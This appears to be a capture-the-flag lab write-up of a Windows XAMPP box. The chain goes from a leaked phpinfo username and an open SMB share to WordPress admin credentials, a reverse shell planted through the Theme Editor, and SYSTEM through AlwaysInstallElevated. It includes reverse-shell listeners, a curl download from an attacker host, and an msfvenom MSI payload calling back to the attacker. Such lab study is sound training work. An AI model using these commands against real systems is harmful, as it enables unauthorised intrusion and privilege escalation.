
## Summary

A chain built almost entirely on **information leakage rather than exploits**: an exposed `phpinfo.php` leaks a username, a misconfigured SMB share hands over a full file dump including a plaintext credentials file, and the username/theme name from earlier leads to a hidden WordPress install. From there, the WordPress Theme Editor (standard admin functionality, not a vulnerability) gives direct RCE. Privesc is a textbook `AlwaysInstallElevated` misconfiguration found via winPEAS.

**Chain:** phpinfo.php leaks username → SMB share dumps files → plaintext creds file found → hidden WordPress install discovered via username/theme clues → WP Theme Editor RCE → winPEAS finds AlwaysInstallElevated → malicious MSI → SYSTEM

---

## Enumeration

### Nmap

```bash
sudo nmap -Pn -n $IP -sC -sV -p- --open
sudo nmap -Pn -n $IP -sU --top-ports=100 --reason
```

Full TCP scan first (catches services on unusual ports), UDP top-100 running in parallel. `--reason` on the UDP scan explains _why_ Nmap called a port open/filtered/closed, useful for judging how confident to be in a UDP result.

**Results — a lot of surface area:**

- `21/tcp` — FTP, FileZilla ftpd 0.9.41 beta
- `80/tcp` & `443/tcp` — Apache/PHP on Windows, XAMPP default page, redirects to `/dashboard/`
- `135/139/445` — Windows RPC / SMB
- `3306/tcp` — MariaDB, refusing external connections
- `5040/tcp` — unclear purpose (Windows "scratch" RPC-adjacent port); not enumerable, not useful here
- `49664+` — high RPC ports, standard Windows noise

**Pattern to remember:** on Windows boxes, expect this exact port spread (135/139/445 + a pile of high `49xxx` RPC ports) as background noise. Don't waste time trying to enumerate every one of them individually — focus on the services that actually accept connections (SMB, web, DB).

### Port 80/443 — content discovery

```bash
sudo gobuster dir -w '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' -u http://$IP:80 -t 42 -b 400,401,403,404 --no-error -x php
```

Found a `/dashboard/` with links including `phpMyAdmin.php` and `phpinfo.php`.

- `phpMyAdmin.php` — locked down, no access.
- `phpinfo.php` — **wide open.** This is an information-disclosure bug in its own right (default XAMPP install artifact, should never ship to production).

**What phpinfo.php leaked:**

- Exact Windows version
- A username, **`shenzi`**, visible in file paths
- Install/document root paths
- `disable_functions` = empty → if RCE is ever achieved, no dangerous PHP functions (`exec`, `system`, etc.) are blocked
- The page reflects the request's User-Agent header back — flagged as a "maybe useful for log/header poisoning" observation, not something exploited on this box, but worth remembering as a class of technique

**Pattern to remember:** `phpinfo.php` left exposed is genuinely valuable, not just trivia. Treat every field as a potential lead: usernames in paths, install directories, PHP config that indicates whether webshells will be unrestricted, and version info for CVE lookups. It's one of the highest-value single pages to find on any PHP box.

### Ports 135/139/445 — RPC and SMB

```bash
rpcclient -U '' -N $IP
enum4linux $IP
smbclient -N -L \\\\$IP\\
```

`enum4linux` came back empty, but `smbclient` succeeded independently — worth noting neither tool is a strict superset of the other, so running both costs little and catches cases where one fails silently.

Found and connected to a share named **`Shenzi`** (matching the username from phpinfo):

```bash
smbclient \\\\$IP\\Shenzi
```

Downloaded the entire share (`mget *` or similar), then searched it for embedded credentials:

```bash
grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)'
```

This turned up a `passwords.txt` file — a leftover XAMPP documentation file listing every default service credential, **plus one non-default entry**:

```
WordPress:
  User: admin
  Password: FeltHeadwallWight357
```

No WordPress site had been found yet at this point — the creds were sitting there without an obvious place to use them.

Also checked (and confirmed denied) whether the share allowed uploads — worth always checking write access on any share you can read, since read-plus-write on a web-adjacent share is a very short path to RCE.

**Pattern to remember:** always grep any dumped file set for credential-shaped keywords rather than relying purely on manually browsing. Also — finding credentials with no obvious login target yet isn't a dead end, it's a reason to keep looking for where they apply.

---

## Exploitation

### Finding the hidden WordPress install

Gobuster's wordlists didn't surface `/wp-admin`, `/wp-content`, or any standard WordPress path — meaning the install lives at a non-default, unlisted directory name. The **username `shenzi`** (seen repeatedly in phpinfo.php and the SMB share name) turned out to also be the WordPress install path:

```
http://$IP/shenzi/
http://$IP/shenzi/wp-admin/
```

**Pattern to remember:** when a name (username, hostname, share name, app name) shows up repeatedly across unrelated services, try it as a directory/path guess even if it's not in any wordlist. Wordlists can't cover box-specific naming — this kind of contextual OSINT often finds what brute-forcing can't. Boxes frequently reuse a single "theme name" across multiple components.

### Logging into wp-admin

The leaked WordPress credentials (`admin:FeltHeadwallWight357`) authenticated successfully against `/shenzi/wp-admin/`.

### RCE via Theme Editor

Rather than hunting for a plugin/theme CVE, WordPress's own built-in **Theme Editor** (Appearance → Theme Editor) allows direct in-browser editing of theme PHP files for any authenticated admin. This is intended functionality, not a vulnerability — but it's a direct code-execution primitive once you have admin creds.

Steps:

1. Pick a theme file that's reachable **without authentication** from outside — a template like `404.php` is ideal, since visiting any nonexistent URL triggers it.
2. Replace its contents with a PHP reverse shell (used the Ivan Sincek PHP shell from [revshells.com](https://revshells.com/)).
3. Save/update the file through the Theme Editor.
4. Set up a listener, then trigger the shell by requesting the file path directly:

```
http://$IP/shenzi/wp-content/themes/twentytwenty/404.php
```

```bash
sudo rlwrap nc -lnvp 135
```

**Note on port choice:** used port 135 for the listener specifically to blend with expected Windows RPC traffic and reduce the chance of egress filtering blocking an unusual port — worth remembering as a general evasion habit on Windows targets.

Shell received, landing in the WordPress document root as confirmed by paths seen earlier in phpinfo.php.

**Pattern to remember:** any CMS admin panel with a built-in code/theme/plugin editor is an RCE primitive by design, once you have valid admin credentials — no CVE or plugin vulnerability required. This applies broadly (WordPress Theme/Plugin Editor, other CMS "edit template" features). Always pick a template file reachable pre-authentication so you don't need a second login just to trigger the payload.

---

## Privilege Escalation

### Automated enumeration with winPEAS

Transferred winPEAS to the target and ran it — a standard first move on any freshly-landed Windows shell.

```powershell
curl http://<attacker_ip>:8000/winPEASany.exe -o winpeas.exe
.\winpeas.exe
```

winPEAS flagged **`AlwaysInstallElevated`** as enabled — a registry misconfiguration (both `HKLM` and `HKCU` values set to `1`) that causes Windows to install any `.msi` package with **SYSTEM/Administrator privileges**, regardless of the invoking user's actual permissions.

**Pattern to remember:** winPEAS/PEASS should be a default step on any Windows foothold, the same way `sudo -l` + pspy/LinPEAS are default on Linux. `AlwaysInstallElevated` specifically is a fast, reliable win whenever it shows up — worth checking for by name even manually via:

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both must be set to `1` for the technique to work.

### Building and deploying a malicious MSI

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=445 -f msi -o shell.msi
```

Set up a new listener on the chosen port, transferred `shell.msi` to the target, and installed it — any user can trigger an MSI install, and `AlwaysInstallElevated` forces it to run with elevated privileges regardless of who ran it.

```powershell
msiexec /i shell.msi
```

Listener catches a SYSTEM-level shell.

---

## Lessons / Transferable Techniques

1. **`phpinfo.php` left exposed is a goldmine, not trivia.** Read every field — usernames in paths, PHP config flags, install directories — and carry them forward as leads.
2. **Run both `enum4linux` and `smbclient` against SMB.** They fail independently and don't fully overlap.
3. **Grep dumped file shares for credential keywords** rather than only browsing manually.
4. **Recurring names (usernames, share names, hostnames) across services are directory-guessing leads**, even when no wordlist contains them — this is contextual OSINT, and boxes often reuse one "theme name" everywhere.
5. **CMS admin editors (theme/plugin editors) are RCE by design once authenticated as admin** — no CVE needed. Pick a template reachable pre-auth to trigger the payload without a second login.
6. **winPEAS/LinPEAS should run automatically on every fresh foothold**, Windows or Linux — don't rely purely on manual enumeration once these tools are available.
7. **`AlwaysInstallElevated` → malicious MSI via msfvenom** is a fast, complete, repeatable Windows privesc chain whenever the registry keys are set. Worth having the `msfvenom -f msi` command memorized.
